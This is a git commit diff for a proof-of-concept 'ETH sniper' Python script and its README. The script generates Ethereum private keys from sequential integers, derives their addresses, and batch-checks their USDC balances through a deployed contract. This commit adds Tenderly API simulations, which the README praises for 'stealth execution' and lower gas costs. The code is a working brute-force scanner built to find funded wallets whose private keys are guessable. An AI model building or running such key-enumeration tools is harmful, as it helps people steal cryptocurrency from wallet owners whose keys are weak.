a76a86b0dc81befbe7a2676d6318399159daddee
Christian Papathanasiou <chris@athcon.org>
2023-09-18 09:25:35 +0300

    Added tenderly simulation

--- README.md
+++ README.md
@@ -10,6 +10,9 @@ By leveraging the smart contract we are able to very quickly batch check hundred
 
 If an address is found which has a positive USDC balance, then the deployed ETH sniper contract will emit an event that is observable on the blockchain and can be alerted upon using conventional blockchain event alerting tools.
 
-Created as a proof of concept, no liability accepted. This will never work and liklihood of finding any wallet with a positive balance is infinitesimally small. Running this will likely result in spending all your funds in your wallet in gas fees.
+Update:
+In v2, I have now integrated Tenderly simulations to run the contract executions against the tenderly API and to parse the Tenderly API JSON reply to check if any logs were emmited from the contract which would indicate an address was found with a positive balance. By using Tenderly simulations we do not need to execute these transactions on the blockchain adding a) a layer of stealth execution and b) saving on gas costs.
+
+Created as a proof of concept, no liability accepted. This will never work and liklihood of finding any wallet with a positive balance is infinitesimally small. 
 
 - C. Papathanasiou
--- sniper.py
+++ sniper.py
@@ -2,29 +2,33 @@ from eth_keys import keys
 from eth_utils import encode_hex, decode_hex
 from web3 import Web3
 import json
-w3 = Web3(Web3.HTTPProvider("")) #your infura
+import requests
+from decimal import Decimal
+w3 = Web3(Web3.HTTPProvider("")) #infura
 
-abi = json.loads('[{"name":"USDBalances","inputs":[{"name":"_address","type":"address","indexed":false},{"name":"_balance","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"stateMutability":"nonpayable","type":"function","name":"getUSDCBalances","inputs":[{"name":"addresses","type":"address[100]"}],"outputs":[{"name":"","type":"uint256"}],"gas":4820524}]')
+abi = json.loads('[{"name":"USDBalances","inputs":[{"name":"_address","type":"address","indexed":false},{"name":"_balance","type":"uint256","indexed":false}],"anonymous":false,"type":"event"},{"stateMutability":"nonpayable","type":"function","name":"getUSDCBalances","inputs":[{"name":"addresses","type":"address[500]"}],"outputs":[{"name":"","type":"uint256"}],"gas":4820524}]')
 
-private = ""  #your private key
+private = "" #Private key
 acct = w3.eth.account.from_key(private)
 
 w3.eth.defaultAccount = acct.address
 
-contract_address = "" #deployed address
-
+contract_address_polygon = "" 
+contract_address = ""
 contract = w3.eth.contract(address=w3.to_checksum_address(contract_address), abi=abi)
-
+tenderly_user = ""
+tenderly_project = ""
+tenderly_access_code = ""
 
 
 # Define the start and end indices
-start_index = 10002000
-end_index = 10900000  # Set the end index to 2000 for this example
+start_index = 1
+end_index = 1000000 
 
 # Create a list to store the generated Ethereum addresses
 generated_addresses = []
 
-batch_size = 100  # Set the batch size to 1000 addresses
+batch_size = 500  # Set the batch size to 500 addresses
 
 for i in range(start_index, end_index + 1):
     # Generate a private key from the index (You should use a more secure method for generating private keys)
@@ -43,7 +47,6 @@ for i in range(start_index, end_index + 1):
         formatted_addresses = '[' + ', '.join(generated_addresses) + ']'
 
         # Print the formatted addresses for the current batch
-        print(formatted_addresses)
 
         # Clear the list for the next batch
         generated_addresses = []
@@ -53,16 +56,42 @@ for i in range(start_index, end_index + 1):
             try:
                 nonce = w3.eth.get_transaction_count(acct.address)
                 transaction = contract.functions.getUSDCBalances(eval(formatted_addresses)).build_transaction({
-                    'chainId': 137,  # Mainnet
+                    'chainId': 1,  # Mainnet
                     'gas': 2500000,  # Adjust the gas limit as needed
                     'gasPrice': 238000000000,  # Adjust the gas price as needed
                     'nonce': nonce
                 })
 
-                signed = acct.sign_transaction(transaction)
-                tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
-                tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
-                print(tx_receipt)
+                #signed = acct.sign_transaction(transaction)
+                #tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
+                #tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+             
+
+
+                data = {"network_id":"1","from":"0x0000000000000000000000000000000000000000","input":transaction["data"],"to":contract_address,"gas":8000000,"gas_price":"0","value":"0"}
+
+                headers = { 
+                "content-type": "application/json",
+                "X-Access-Key": tenderly_access_code
+                }
+
+                response=requests.post("https://api.tenderly.co/api/v1/account/" + tenderly_user + "/project/" + tenderly_project + "/simulate",data=json.dumps(data),headers=headers)
+
+                x = json.loads(response.text)
+                logs = x["transaction"]["transaction_info"]["logs"]
+                if logs is None:
+                    print("nothing found")
+                else:
+                    
+                    print("******************************")
+                    print(formatted_addresses)
+                    print("0x" + logs[0]["raw"]["data"][26:66])
+                    _hex = Decimal(int(logs[0]["raw"]["data"][-7:],base=16))
+                    print(_hex / 10**6)
+                    print("******************************")
+
+
+                #print(tx_receipt)
             except Exception as e:
-                print("ack!!: %s" % e)
+                print("Exception!!: %s" % e)
 
